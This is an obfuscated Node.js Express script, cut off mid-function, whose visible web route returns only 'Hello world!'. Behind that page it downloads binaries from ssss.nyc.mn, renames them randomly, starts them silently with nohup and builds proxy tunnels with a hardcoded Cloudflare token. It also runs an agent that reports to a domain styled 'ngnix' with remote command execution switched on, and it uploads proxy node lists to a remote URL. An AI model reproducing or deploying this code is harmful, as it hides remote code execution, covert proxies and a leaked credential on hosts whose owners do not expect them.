const _0xddf4d6=_0x42aa;(function(_0x1e49e0,_0x5a0d5f){const _0x48d2bd={_0x3800e8:0x1bb,_0x1c5f29:0x1d3,_0x260e13:0x1e5,_0x214355:0x1ea,_0x293625:0x1d8},_0x35db2d=_0x42aa,_0x2bbe87=_0x1e49e0();while(!![]){try{const _0x100b3d=-parseInt(_0x35db2d(0x217))/0x1*(-parseInt(_0x35db2d(_0x48d2bd._0x3800e8))/0x2)+parseInt(_0x35db2d(0x195))/0x3*(parseInt(_0x35db2d(0x1a2))/0x4)+parseInt(_0x35db2d(_0x48d2bd._0x1c5f29))/0x5+-parseInt(_0x35db2d(_0x48d2bd._0x260e13))/0x6*(-parseInt(_0x35db2d(0x1cb))/0x7)+parseInt(_0x35db2d(_0x48d2bd._0x214355))/0x8*(parseInt(_0x35db2d(0x1a8))/0x9)+-parseInt(_0x35db2d(0x1b0))/0xa+-parseInt(_0x35db2d(0x1d1))/0xb*(parseInt(_0x35db2d(_0x48d2bd._0x293625))/0xc);if(_0x100b3d===_0x5a0d5f)break;else _0x2bbe87['push'](_0x2bbe87['shift']());}catch(_0x2a6968){_0x2bbe87['push'](_0x2bbe87['shift']());}}}(_0x5e5e,0x2f84f));const express=require(_0xddf4d6(0x1eb)),app=express(),axios=require(_0xddf4d6(0x181)),os=require('os'),fs=require('fs'),path=require(_0xddf4d6(0x1fb)),{promisify}=require('util'),exec=promisify(require(_0xddf4d6(0x226))[_0xddf4d6(0x17f)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0xddf4d6(0x1c7)]||'',PROJECT_URL=process[_0xddf4d6(0x16b)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0xddf4d6(0x16b)][_0xddf4d6(0x1ba)]||![],FILE_PATH=process[_0xddf4d6(0x16b)]['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0xddf4d6(0x184)]||_0xddf4d6(0x166),PORT=process[_0xddf4d6(0x16b)][_0xddf4d6(0x205)]||process[_0xddf4d6(0x16b)][_0xddf4d6(0x168)]||0xbb8,UUID=process[_0xddf4d6(0x16b)][_0xddf4d6(0x1f0)]||'02363f4d-3853-8e5d-6289-ef449b4ff1ab',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'ngnix.hndz.qzz.io:80',NEZHA_PORT=process[_0xddf4d6(0x16b)][_0xddf4d6(0x229)]||'',NEZHA_KEY=process[_0xddf4d6(0x16b)]['NEZHA_KEY']||_0xddf4d6(0x1af),ARGO_DOMAIN=process[_0xddf4d6(0x16b)][_0xddf4d6(0x216)]||_0xddf4d6(0x1dc),ARGO_AUTH=process[_0xddf4d6(0x16b)][_0xddf4d6(0x16c)]||_0xddf4d6(0x21f),ARGO_PORT=process[_0xddf4d6(0x16b)]['ARGO_PORT']||0x1f41,CFIP=process[_0xddf4d6(0x16b)][_0xddf4d6(0x174)]||_0xddf4d6(0x1a3),CFPORT=process[_0xddf4d6(0x16b)][_0xddf4d6(0x1db)]||0x1bb,NAME=process[_0xddf4d6(0x16b)][_0xddf4d6(0x198)]||_0xddf4d6(0x170);!fs[_0xddf4d6(0x21c)](FILE_PATH)?(fs[_0xddf4d6(0x1a1)](FILE_PATH),console[_0xddf4d6(0x1e4)](FILE_PATH+'\x20is\x20created')):console[_0xddf4d6(0x1e4)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1de994={_0x3ff65b:0x199,_0x350a0a:0x1fe,_0xbc463e:0x21a},_0x194857=_0xddf4d6,_0x44ad16=_0x194857(_0x1de994._0x3ff65b);let _0x42893e='';for(let _0x5387a8=0x0;_0x5387a8<0x6;_0x5387a8++){_0x42893e+=_0x44ad16[_0x194857(_0x1de994._0x350a0a)](Math[_0x194857(0x197)](Math[_0x194857(_0x1de994._0xbc463e)]()*_0x44ad16[_0x194857(0x16f)]));}return _0x42893e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xddf4d6(0x1bd)](FILE_PATH,phpName),webPath=path[_0xddf4d6(0x1bd)](FILE_PATH,webName),botPath=path[_0xddf4d6(0x1bd)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0xddf4d6(0x1bd)](FILE_PATH,_0xddf4d6(0x21d)),bootLogPath=path[_0xddf4d6(0x1bd)](FILE_PATH,'boot.log'),configPath=path[_0xddf4d6(0x1bd)](FILE_PATH,_0xddf4d6(0x1bc));function _0x5e5e(){const _0x58db54=['&path=%2Ftrojan-argo%3Fed%3D2560#','exec','\x20>/dev/null\x202>&1','axios','https://arm64.ssss.nyc.mn/bot','boot.log','SUB_PATH','\x20-c\x20\x22','https://amd64.ssss.nyc.mn/agent','/dev/null','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','fileUrl','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20credentials-file:\x20','Content-Type','country_code','/vless-argo','pipe','/api/add-subscriptions','all','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','323199WAiwfS','https+local://8.8.8.8/dns-query','floor','NAME','abcdefghijklmnopqrstuvwxyz','firefox','/api/add-nodes','true','2083','\x0aclient_secret:\x20','ArgoDomain:','org','mkdirSync','4masymd','cdns.doon.eu.org','https://amd64.ssss.nyc.mn/web','tunnel.yml','/trojan-argo','finish','1233SUgheV','NEZHA\x20variable\x20is\x20empty,skip\x20running','direct','platform','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','TunnelSecret','\x0a\x0avmess://','pFyT4RYC2IK0DmlyVyfEDZpiLYaZnBoh','1805650GpOZoU','2096','php\x20running\x20error:\x20','http://ip-api.com/json/','https://arm64.ssss.nyc.mn/agent','\x20-s\x20','test','https://arm64.ssss.nyc.mn/v1','clear','\x0a\x20\x20\x20\x20','AUTO_ACCESS','14mHPSlj','config.json','join','readFileSync','tunnel.json','includes','Download\x20','2053','\x20-p\x20','Subscription\x20uploaded\x20successfully','push','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','UPLOAD_URL','amd','countryCode','success','98IrVEin','pop','vless','message','\x20>/dev/null\x202>&1\x20&','block','391908kzSpLa','\x0a\x20\x20tunnel:\x20','662745QvHHJH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/vmess-argo?ed=2560','/vmess-argo','arm64','60sScuNw','unshift','win32','CFPORT','leaflow2.hndz.qzz.io','npm\x20running\x20error:\x20','from','Error\x20reading\x20boot.log:','response','fileName','data','http','log','58764QXEAvG','pkill\x20-f\x20\x22[','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','utf-8','/sub.txt\x20saved\x20successfully','4888WTeopi','express','.exe\x20>\x20nul\x202>&1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','arm','UUID','error','Hello\x20world!','tls','unlinkSync','none','chmod','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2087','\x20>\x20nul\x202>&1','nohup\x20','path','?security=tls&sni=','8443','charAt','/config.json\x20>/dev/null\x202>&1\x20&','catch','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','close','statSync','status','SERVER_PORT','https://ipapi.co/json/','App\x20is\x20running','has','443','listen','createWriteStream','https://amd64.ssss.nyc.mn/v1','map','&fp=firefox&type=ws&host=','stream','&path=%2Fvless-argo%3Fed%3D2560#','post','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','trojan','Unknown','filter','ARGO_DOMAIN','13177IpHPFE','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','random','Error\x20executing\x20command:\x20','existsSync','list.txt','web\x20running\x20error:\x20','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiMmE3YjYyMDQtMjdlMC00YzkzLWIxNWEtNDExYTRmZjcxN2QzIiwicyI6Ik56SmxORGc0TURrdE1qQXpOaTAwTnpNNExUZzBaakV0TldWak1tRm1aR05oTURoaSJ9','writeFileSync','send','Error\x20downloading\x20files:','stringify','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','quic','child_process','vmess','base64','NEZHA_PORT','\x20successfully','match','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','--tls','sub','basename','PORT','get','/api/delete-nodes','env','ARGO_AUTH','set','freedom','length','leaflow-2','\x20is\x20running','forEach','\x0a\x0atrojan://','CFIP','then','127.0.0.1','toString','taskkill\x20/f\x20/im\x20','split','?encryption=none&security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20-c\x20','application/json'];_0x5e5e=function(){return _0x58db54;};return _0x5e5e();}function deleteNodes(){const _0x33001b={_0x29eb3e:0x21c,_0x39f4c0:0x1be,_0x1909ac:0x1de,_0x3197ef:0x177,_0x154c98:0x215},_0x23b414=_0xddf4d6;try{if(!UPLOAD_URL)return;if(!fs[_0x23b414(_0x33001b._0x29eb3e)](subPath))return;let _0x227c57;try{_0x227c57=fs[_0x23b414(_0x33001b._0x39f4c0)](subPath,_0x23b414(0x1e8));}catch{return null;}const _0x191312=Buffer[_0x23b414(_0x33001b._0x1909ac)](_0x227c57,_0x23b414(0x228))[_0x23b414(_0x33001b._0x3197ef)]('utf-8'),_0x4eca31=_0x191312[_0x23b414(0x179)]('\x0a')[_0x23b414(_0x33001b._0x154c98)](_0x2a01dd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x23b414(0x1b6)](_0x2a01dd));if(_0x4eca31[_0x23b414(0x16f)]===0x0)return;return axios['post'](UPLOAD_URL+_0x23b414(0x16a),JSON[_0x23b414(0x223)]({'nodes':_0x4eca31}),{'headers':{'Content-Type':_0x23b414(0x17d)}})[_0x23b414(0x200)](_0x4a7b69=>{return null;}),null;}catch(_0x422296){return null;}}function cleanupOldFiles(){const _0x1be6f0={_0x3936ea:0x1bd},_0x18e1b6=_0xddf4d6;try{const _0x325d6f=fs['readdirSync'](FILE_PATH);_0x325d6f[_0x18e1b6(0x172)](_0x40eea2=>{const _0x5c0f38=_0x18e1b6,_0xfbcb46=path[_0x5c0f38(_0x1be6f0._0x3936ea)](FILE_PATH,_0x40eea2);try{const _0x3fa70b=fs[_0x5c0f38(0x203)](_0xfbcb46);_0x3fa70b['isFile']()&&fs['unlinkSync'](_0xfbcb46);}catch(_0x4db1d8){}});}catch(_0x145470){}}app[_0xddf4d6(0x169)]('/',function(_0x4bc993,_0x52d4cb){const _0x1d524b={_0x247b46:0x1f2},_0x44e34a=_0xddf4d6;_0x52d4cb[_0x44e34a(0x221)](_0x44e34a(_0x1d524b._0x247b46));});async function generateConfig(){const _0x4fb339={_0x4dfe79:0x187,_0x27be98:0x1f5,_0x2e70fa:0x1cd,_0x4b2582:0x190,_0x3d4c3b:0x1f5,_0x7c2571:0x1e3,_0x2f5863:0x225,_0x4a698a:0x1e3,_0x1477e8:0x213,_0x54aa0c:0x1f3,_0x260c45:0x196,_0x187ea1:0x16e,_0x25c7f6:0x1aa,_0x5c67de:0x1bc},_0x41c7b5=_0xddf4d6,_0xcd205={'log':{'access':'/dev/null','error':_0x41c7b5(_0x4fb339._0x4dfe79),'loglevel':_0x41c7b5(_0x4fb339._0x27be98)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x41c7b5(_0x4fb339._0x2e70fa),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x41c7b5(_0x4fb339._0x4b2582),'dest':0xbba},{'path':_0x41c7b5(0x1d6),'dest':0xbbb},{'path':_0x41c7b5(0x1a6),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x41c7b5(0x176),'protocol':_0x41c7b5(_0x4fb339._0x2e70fa),'settings':{'clients':[{'id':UUID}],'decryption':_0x41c7b5(0x1f5)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x41c7b5(0x1cd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x41c7b5(_0x4fb339._0x27be98)},'streamSettings':{'network':'ws','security':_0x41c7b5(_0x4fb339._0x3d4c3b),'wsSettings':{'path':_0x41c7b5(0x190)}},'sniffing':{'enabled':!![],'destOverride':[_0x41c7b5(_0x4fb339._0x7c2571),_0x41c7b5(0x1f3),_0x41c7b5(_0x4fb339._0x2f5863)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x41c7b5(0x176),'protocol':_0x41c7b5(0x227),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x41c7b5(0x1d6)}},'sniffing':{'enabled':!![],'destOverride':[_0x41c7b5(_0x4fb339._0x4a698a),_0x41c7b5(0x1f3),_0x41c7b5(_0x4fb339._0x2f5863)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x41c7b5(0x176),'protocol':_0x41c7b5(_0x4fb339._0x1477e8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x41c7b5(_0x4fb339._0x27be98),'wsSettings':{'path':_0x41c7b5(0x1a6)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x41c7b5(_0x4fb339._0x54aa0c),_0x41c7b5(0x225)],'metadataOnly':![]}}],'dns':{'servers':[_0x41c7b5(_0x4fb339._0x260c45)]},'outbounds':[{'protocol':_0x41c7b5(_0x4fb339._0x187ea1),'tag':_0x41c7b5(_0x4fb339._0x25c7f6)},{'protocol':'blackhole','tag':_0x41c7b5(0x1d0)}]};fs[_0x41c7b5(0x220)](path[_0x41c7b5(0x1bd)](FILE_PATH,_0x41c7b5(_0x4fb339._0x5c67de)),JSON[_0x41c7b5(0x223)](_0xcd205,null,0x2));}function getSystemArchitecture(){const _0x4ac8c9={_0x2f1826:0x1d7,_0x1dc0bf:0x1c8},_0x37a37a=_0xddf4d6,_0x26c29e=os['arch']();return _0x26c29e==='arm'||_0x26c29e===_0x37a37a(_0x4ac8c9._0x2f1826)||_0x26c29e==='aarch64'?_0x37a37a(0x1ef):_0x37a37a(_0x4ac8c9._0x1dc0bf);}function downloadFile(_0xcca9a7,_0x57ea5e,_0x42eeb2){const _0x5cdcf9={_0x308d6a:0x21c,_0x37edba:0x20b,_0x431536:0x169,_0x6263bd:0x20f,_0xd8b546:0x175},_0x1effff={_0x24b023:0x1c1},_0x1871f1={_0x54e609:0x1e2,_0x1cf4fb:0x191,_0x2ac97e:0x1a7,_0x1e3461:0x1f1},_0x25d701={_0x5a2b9d:0x1ce},_0x100b17=_0xddf4d6,_0x6c9f35=_0xcca9a7;!fs[_0x100b17(_0x5cdcf9._0x308d6a)](FILE_PATH)&&fs[_0x100b17(0x1a1)](FILE_PATH,{'recursive':!![]});const _0x3ae6f0=fs[_0x100b17(_0x5cdcf9._0x37edba)](_0x6c9f35);axios({'method':_0x100b17(_0x5cdcf9._0x431536),'url':_0x57ea5e,'responseType':_0x100b17(_0x5cdcf9._0x6263bd)})[_0x100b17(_0x5cdcf9._0xd8b546)](_0x296e1d=>{const _0x462910={_0x5a7c0a:0x1e4,_0x13e81b:0x22a},_0x9f15c9=_0x100b17;_0x296e1d[_0x9f15c9(_0x1871f1._0x54e609)][_0x9f15c9(_0x1871f1._0x1cf4fb)](_0x3ae6f0),_0x3ae6f0['on'](_0x9f15c9(_0x1871f1._0x2ac97e),()=>{const _0x43a8e1=_0x9f15c9;_0x3ae6f0[_0x43a8e1(0x202)](),console[_0x43a8e1(_0x462910._0x5a7c0a)](_0x43a8e1(0x1c1)+path['basename'](_0x6c9f35)+_0x43a8e1(_0x462910._0x13e81b)),_0x42eeb2(null,_0x6c9f35);}),_0x3ae6f0['on'](_0x9f15c9(_0x1871f1._0x1e3461),_0x8355a0=>{const _0x2917ce=_0x9f15c9;fs['unlink'](_0x6c9f35,()=>{});const _0x20d319=_0x2917ce(0x1c1)+path['basename'](_0x6c9f35)+'\x20failed:\x20'+_0x8355a0[_0x2917ce(_0x25d701._0x5a2b9d)];console[_0x2917ce(0x1f1)](_0x20d319),_0x42eeb2(_0x20d319);});})['catch'](_0x394efd=>{const _0xe9c064=_0x100b17,_0x49a61d=_0xe9c064(_0x1effff._0x24b023)+path[_0xe9c064(0x167)](_0x6c9f35)+'\x20failed:\x20'+_0x394efd[_0xe9c064(0x1ce)];console[_0xe9c064(0x1f1)](_0x49a61d),_0x42eeb2(_0x49a61d);});}async function downloadFilesAndRun(){const _0x48c286={_0x1b8f6f:0x1e4,_0xe4e7e7:0x193,_0x405c82:0x222,_0x555039:0x179,_0xa14cc2:0x209,_0x2e4b2d:0x1c2,_0x19cff8:0x188,_0x359625:0x218,_0x27c50c:0x185,_0xcc4e99:0x189,_0x1806bf:0x1b2,_0x480e65:0x19d,_0x490caa:0x165,_0x3ee0ac:0x1b5,_0x74b4d7:0x1c3,_0x3c54e2:0x1e4,_0x5d3b6c:0x171,_0x1852ca:0x1f1,_0x4f409d:0x1dd,_0x55b9f3:0x1a9,_0x472a1f:0x1fa,_0x3737ce:0x171,_0x2414e2:0x1f1,_0x34f77c:0x22b,_0x4c392d:0x201,_0x4c6615:0x224,_0x4b35e1:0x1ac,_0x1f5c50:0x1fa,_0x4dc5e6:0x21b},_0x4e0a83={_0x18cfdc:0x1f6},_0x19163c=_0xddf4d6,_0x1003f3=getSystemArchitecture(),_0x30ace1=getFilesForArchitecture(_0x1003f3);if(_0x30ace1[_0x19163c(0x16f)]===0x0){console[_0x19163c(_0x48c286._0x1b8f6f)](_0x19163c(0x1f7));return;}const _0x28f8fc=_0x30ace1[_0x19163c(0x20d)](_0x3d7a8e=>{return new Promise((_0x3de425,_0x282b78)=>{const _0x41e3ad=_0x42aa;downloadFile(_0x3d7a8e[_0x41e3ad(0x1e1)],_0x3d7a8e[_0x41e3ad(0x18b)],(_0x4ba210,_0x43bb2c)=>{_0x4ba210?_0x282b78(_0x4ba210):_0x3de425(_0x43bb2c);});});});try{await Promise[_0x19163c(_0x48c286._0xe4e7e7)](_0x28f8fc);}catch(_0xb3a11d){console[_0x19163c(0x1f1)](_0x19163c(_0x48c286._0x405c82),_0xb3a11d);return;}function _0x1c34e1(_0x3fdd79){const _0x4dfe47=0x1fd;_0x3fdd79['forEach'](_0x2fd645=>{const _0x2e33b1={_0x5b3a88:0x177},_0x511c78=_0x42aa;fs[_0x511c78(0x21c)](_0x2fd645)&&fs[_0x511c78(_0x4e0a83._0x18cfdc)](_0x2fd645,_0x4dfe47,_0x5acc76=>{const _0x377da2=_0x511c78;_0x5acc76?console[_0x377da2(0x1f1)]('Empowerment\x20failed\x20for\x20'+_0x2fd645+':\x20'+_0x5acc76):console[_0x377da2(0x1e4)]('Empowerment\x20success\x20for\x20'+_0x2fd645+':\x20'+_0x4dfe47[_0x377da2(_0x2e33b1._0x5b3a88)](0x8));});});}const _0x520fb2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1c34e1(_0x520fb2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd77430=NEZHA_SERVER[_0x19163c(0x1c0)](':')?NEZHA_SERVER[_0x19163c(_0x48c286._0x555039)](':')[_0x19163c(0x1cc)]():'',_0x203db7=new Set([_0x19163c(_0x48c286._0xa14cc2),_0x19163c(0x1fd),_0x19163c(0x1b1),'2087','2083',_0x19163c(_0x48c286._0x2e4b2d)]),_0x10ac98=_0x203db7[_0x19163c(0x208)](_0xd77430)?_0x19163c(0x19c):'false',_0x5ac43e=_0x19163c(0x19e)+NEZHA_KEY+_0x19163c(_0x48c286._0x19cff8)+NEZHA_SERVER+_0x19163c(0x1d4)+_0x10ac98+_0x19163c(_0x48c286._0x359625)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x5ac43e);const _0x2dd85b=_0x19163c(0x1fa)+phpPath+_0x19163c(_0x48c286._0x27c50c)+FILE_PATH+_0x19163c(_0x48c286._0xcc4e99);try{await exec(_0x2dd85b),console[_0x19163c(0x1e4)](phpName+'\x20is\x20running'),await new Promise(_0x3c56b=>setTimeout(_0x3c56b,0x3e8));}catch(_0x1412d5){console['error'](_0x19163c(_0x48c286._0x1806bf)+_0x1412d5);}}else{let _0x5100fc='';const _0x20c3a1=[_0x19163c(0x209),_0x19163c(0x1fd),'2096',_0x19163c(0x1f8),_0x19163c(_0x48c286._0x480e65),'2053'];_0x20c3a1[_0x19163c(0x1c0)](NEZHA_PORT)&&(_0x5100fc=_0x19163c(_0x48c286._0x490caa));const _0x491af4=_0x19163c(0x1fa)+npmPath+_0x19163c(_0x48c286._0x3ee0ac)+NEZHA_SERVER+':'+NEZHA_PORT+_0x19163c(_0x48c286._0x74b4d7)+NEZHA_KEY+'\x20'+_0x5100fc+_0x19163c(0x1c6);try{await exec(_0x491af4),console[_0x19163c(_0x48c286._0x3c54e2)](npmName+_0x19163c(_0x48c286._0x5d3b6c)),await new Promise(_0x2427ae=>setTimeout(_0x2427ae,0x3e8));}catch(_0x2e93b2){console[_0x19163c(_0x48c286._0x1852ca)](_0x19163c(_0x48c286._0x4f409d)+_0x2e93b2);}}}else console[_0x19163c(0x1e4)](_0x19163c(_0x48c286._0x55b9f3));const _0x32496d=_0x19163c(_0x48c286._0x472a1f)+webPath+_0x19163c(0x17c)+FILE_PATH+_0x19163c(0x1ff);try{await exec(_0x32496d),console[_0x19163c(_0x48c286._0x3c54e2)](webName+_0x19163c(_0x48c286._0x3737ce)),await new Promise(_0x13cc15=>setTimeout(_0x13cc15,0x3e8));}catch(_0x597631){console[_0x19163c(_0x48c286._0x2414e2)](_0x19163c(0x21e)+_0x597631);}if(fs[_0x19163c(0x21c)](botPath)){let _0x1ca4e8;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1ca4e8=_0x19163c(0x219)+ARGO_AUTH;else ARGO_AUTH[_0x19163c(_0x48c286._0x34f77c)](/TunnelSecret/)?_0x1ca4e8=_0x19163c(_0x48c286._0x4c392d)+FILE_PATH+'/tunnel.yml\x20run':_0x1ca4e8=_0x19163c(_0x48c286._0x4c6615)+FILE_PATH+_0x19163c(_0x48c286._0x4b35e1)+ARGO_PORT;try{await exec(_0x19163c(_0x48c286._0x1f5c50)+botPath+'\x20'+_0x1ca4e8+_0x19163c(0x1cf)),console[_0x19163c(0x1e4)](botName+_0x19163c(0x171)),await new Promise(_0x286e4c=>setTimeout(_0x286e4c,0x7d0));}catch(_0x79dfce){console[_0x19163c(0x1f1)](_0x19163c(_0x48c286._0x4dc5e6)+_0x79dfce);}}await new Promise(_0x42428f=>setTimeout(_0x42428f,0x1388));}function getFilesForArchitecture(_0x5bb5a7){const _0x1dbaff={_0x4de46d:0x1ef,_0x362cf5:0x182,_0x39de4d:0x1b7,_0x1b998d:0x1d9},_0x432fd2=_0xddf4d6;let _0x197ca7;_0x5bb5a7===_0x432fd2(_0x1dbaff._0x4de46d)?_0x197ca7=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x432fd2(_0x1dbaff._0x362cf5)}]:_0x197ca7=[{'fileName':webPath,'fileUrl':_0x432fd2(0x1a4)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x52dddd=_0x5bb5a7===_0x432fd2(0x1ef)?_0x432fd2(0x1b4):_0x432fd2(0x186);_0x197ca7[_0x432fd2(0x1d9)]({'fileName':npmPath,'fileUrl':_0x52dddd});}else{const _0xdebe67=_0x5bb5a7===_0x432fd2(_0x1dbaff._0x4de46d)?_0x432fd2(_0x1dbaff._0x39de4d):_0x432fd2(0x20c);_0x197ca7[_0x432fd2(_0x1dbaff._0x1b998d)]({'fileName':phpPath,'fileUrl':_0xdebe67});}}return _0x197ca7;}function argoType(){const _0x1e76b5={_0x554d27:0x1e4,_0x5406b5:0x1c0,_0x4a7d7e:0x1ad,_0x17bc11:0x1bd,_0x258828:0x1d2,_0x86c63d:0x18d,_0xe61a8f:0x1bf,_0x2740eb:0x17b,_0x4542aa:0x164,_0x18a991:0x1ed},_0x276da9=_0xddf4d6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x276da9(_0x1e76b5._0x554d27)](_0x276da9(0x1e7));return;}if(ARGO_AUTH[_0x276da9(_0x1e76b5._0x5406b5)](_0x276da9(_0x1e76b5._0x4a7d7e))){fs[_0x276da9(0x220)](path[_0x276da9(_0x1e76b5._0x17bc11)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x187015=_0x276da9(_0x1e76b5._0x258828)+ARGO_AUTH[_0x276da9(0x179)]('\x22')[0xb]+_0x276da9(_0x1e76b5._0x86c63d)+path[_0x276da9(0x1bd)](FILE_PATH,_0x276da9(_0x1e76b5._0xe61a8f))+_0x276da9(_0x1e76b5._0x2740eb)+ARGO_DOMAIN+_0x276da9(0x1ee)+ARGO_PORT+_0x276da9(_0x1e76b5._0x4542aa);fs[_0x276da9(0x220)](path[_0x276da9(_0x1e76b5._0x17bc11)](FILE_PATH,_0x276da9(0x1a5)),_0x187015);}else console[_0x276da9(0x1e4)](_0x276da9(_0x1e76b5._0x18a991));}async function extractDomains(){const _0x361da0={_0x122450:0x1e4,_0x451ea4:0x1be,_0x2ffa9d:0x172,_0xff0dda:0x19f,_0x5aef70:0x194,_0xe4ada2:0x1ac,_0x2cab0f:0x1cf,_0xf2c64e:0x21b},_0x44027e={_0x20e7d5:0x169,_0x4c1e03:0x206,_0x4be4f8:0x1e2,_0xe034c2:0x1e2,_0x2d9a2b:0x1a0,_0x507a16:0x1e2,_0x426418:0x1e2,_0x5d5c5c:0x1ca,_0x24ca67:0x214},_0x5da28c={_0x49e8df:0x1ab,_0x32a1d6:0x1da,_0x32d9d3:0x1ec,_0x56f828:0x1e6,_0x3276bd:0x18c},_0x5edd36=_0xddf4d6;let _0x203733;if(ARGO_AUTH&&ARGO_DOMAIN)_0x203733=ARGO_DOMAIN,console[_0x5edd36(_0x361da0._0x122450)]('ARGO_DOMAIN:',_0x203733),await _0x3004de(_0x203733);else try{const _0x1cfc51=fs[_0x5edd36(_0x361da0._0x451ea4)](path[_0x5edd36(0x1bd)](FILE_PATH,_0x5edd36(0x183)),_0x5edd36(0x1e8)),_0x308ddd=_0x1cfc51[_0x5edd36(0x179)]('\x0a'),_0x5e6cb7=[];_0x308ddd[_0x5edd36(_0x361da0._0x2ffa9d)](_0xa331bd=>{const _0x123f6e=_0x5edd36,_0x18373e=_0xa331bd[_0x123f6e(0x22b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x18373e){const _0x26740a=_0x18373e[0x1];_0x5e6cb7['push'](_0x26740a);}});if(_0x5e6cb7[_0x5edd36(0x16f)]>0x0)_0x203733=_0x5e6cb7[0x0],console[_0x5edd36(_0x361da0._0x122450)](_0x5edd36(_0x361da0._0xff0dda),_0x203733),await _0x3004de(_0x203733);else{console['log'](_0x5edd36(_0x361da0._0x5aef70)),fs[_0x5edd36(0x1f4)](path[_0x5edd36(0x1bd)](FILE_PATH,'boot.log'));async function _0xc933a4(){const _0x473b96=_0x5edd36;try{process[_0x473b96(_0x5da28c._0x49e8df)]===_0x473b96(_0x5da28c._0x32a1d6)?await exec(_0x473b96(0x178)+botName+_0x473b96(_0x5da28c._0x32d9d3)):await exec(_0x473b96(_0x5da28c._0x56f828)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x473b96(_0x5da28c._0x3276bd));}catch(_0x169485){}}_0xc933a4(),await new Promise(_0x4e191c=>setTimeout(_0x4e191c,0xbb8));const _0x4c9ce2=_0x5edd36(0x224)+FILE_PATH+_0x5edd36(_0x361da0._0xe4ada2)+ARGO_PORT;try{await exec(_0x5edd36(0x1fa)+botPath+'\x20'+_0x4c9ce2+_0x5edd36(_0x361da0._0x2cab0f)),console['log'](botName+_0x5edd36(0x171)),await new Promise(_0x5bc923=>setTimeout(_0x5bc923,0xbb8)),await extractDomains();}catch(_0x2b6d79){console[_0x5edd36(0x1f1)](_0x5edd36(_0x361da0._0xf2c64e)+_0x2b6d79);}}}catch(_0x4d2b8a){console[_0x5edd36(0x1f1)](_0x5edd36(0x1df),_0x4d2b8a);}async function _0x3e1ca4(){const _0x28adb9=_0x5edd36;try{const _0x58f620=await axios[_0x28adb9(_0x44027e._0x20e7d5)](_0x28adb9(_0x44027e._0x4c1e03),{'timeout':0xbb8});if(_0x58f620[_0x28adb9(_0x44027e._0x4be4f8)]&&_0x58f620[_0x28adb9(0x1e2)][_0x28adb9(0x18f)]&&_0x58f620[_0x28adb9(_0x44027e._0xe034c2)][_0x28adb9(_0x44027e._0x2d9a2b)])return 